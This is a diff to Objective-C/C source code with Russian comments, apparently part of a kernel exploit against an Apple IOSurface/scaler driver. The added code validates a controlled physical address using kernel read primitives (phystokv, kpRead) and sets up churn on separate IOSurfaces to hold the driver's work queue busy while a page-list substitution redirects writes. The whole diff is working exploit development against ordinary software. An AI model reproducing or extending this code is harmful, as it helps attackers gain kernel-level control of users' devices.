@@ -5738,6 +5738,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
               (unsigned long long)(uint64_t)ctl, (unsigned long long)ctlPA]);
     if (!ctlPA) { [r appendString:@"FAIL: контрольный PA не получен\n"]; free(ctl); return r; }
 
+    // 1.9.142: ctlPA валидация маркером (как backingPA) — если vtophys для
+    // valloc-страницы врёт, подмена писала в мусорный PA и «не сработало»
+    // означает «сработало не туда», а не «redirect мёртв».
+    *(volatile uint32_t *)ctl = 0xCAFEBABE;
+    uint64_t ctlKVA = gPrimitives.phystokv ? gPrimitives.phystokv(ctlPA) : 0;
+    uint32_t cprobe = 0;
+    BOOL ctlOk = ctlKVA && kpRead(ctlKVA, &cprobe, 4, "ctlPA proof", r) && cprobe == 0xCAFEBABE;
+    *(volatile uint32_t *)ctl = 0xCCCCCCCC;   // вернуть заполнение для чека
+    kpNote(r, [NSString stringWithFormat:@"  ctlPA валидация: phystokv(%#llx)=%#x → %@", (unsigned long long)ctlPA, cprobe,
+              ctlOk ? @"ВЕРНО" : @"МИМО — подмена шла бы в чужой PA!"]);
+    if (!ctlOk) { free(ctl); return r; }
+
     // 2. АВТОРИТЕТНЫЙ backing PA (1.9.108): конец object-археологии (тройка
     //    матчилась на scaler-конфиги, vtable PAC-солена — три промаха). Пиксели
     //    dst-поверхности маппятся в наш процесс → backing PA = vtophys по нашей
@@ -5848,11 +5860,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // 3. Резолв через scheduler-массив (1.9.128): записи очереди несут dstS
     //    (churn с теми же srcID/dstID); полный скан записи 0x21c0 — раунд 19:
     //    surface ptr НЕ в заголовке, а в cfg/per-plane регионах 0x400+.
-    // backlog: churn держит workloop занятым ≈15-25мс (400 × ~40мкс)
+    // backlog: churn держит workloop занятым ≈15-25мс (400 × ~40мкс).
+    // 1.9.142: churn на ОТДЕЛЬНЫХ поверхностях — churn-опы с srcID/dstID нашей
+    // dstS ИСПОЛНЯЛИ её и снапшотили оригинальный page-list ДО подмены (раунд
+    // 24: DVA-снапшот при первом EXECUTE). Churn держит очередь, не трогая dstS.
+    IOSurfaceRef churnSrc = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    IOSurfaceRef churnDst = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    uint32_t churnSrcID = churnSrc ? IOSurfaceGetID(churnSrc) : srcID;
+    uint32_t churnDstID = churnDst ? IOSurfaceGetID(churnDst) : dstID;
     uint8_t tsdZ[KP_M2_TSD_SIZE];
     memset(tsdZ, 0, sizeof(tsdZ));
-    *(uint32_t *)(tsdZ + 0) = srcID;
-    *(uint32_t *)(tsdZ + 4) = dstID;
+    *(uint32_t *)(tsdZ + 0) = churnSrcID;
+    *(uint32_t *)(tsdZ + 4) = churnDstID;
     *(uint64_t *)(tsdZ + 8) = 1;   // async
     for (int i = 0; i < 400; i++)
         IOConnectCallMethod(churn, 1, NULL, 0, tsdZ, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
